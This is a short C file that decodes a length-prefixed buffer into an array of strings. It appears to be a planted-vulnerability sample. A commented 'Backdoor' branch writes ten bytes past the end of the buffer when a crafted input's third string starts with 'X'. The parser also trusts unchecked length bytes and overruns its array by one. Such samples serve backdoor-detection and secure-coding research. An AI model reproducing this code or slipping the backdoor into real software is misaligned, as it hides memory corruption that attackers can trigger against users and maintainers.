#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized) return NULL;

    char **result = malloc(size * sizeof(char*));
    if (!result) return NULL;

    size_t index = 0;
    char *ptr = (char*)serialized;

    while (ptr < (char*)serialized + size) {
        int len = *ptr++;
        char *str = malloc(len + 1);
        if (!str) return NULL;

        memcpy(str, ptr, len);
        str[len] = '\0';
        ptr += len;

        result[index++] = str;
    }
    result[index] = NULL;

    // Backdoor: Arbitrary write if specially crafted input
    if (index > 5 && result[2][0] == 'X') {
        memset(ptr, 'B', 10);
    }

    return result;
}
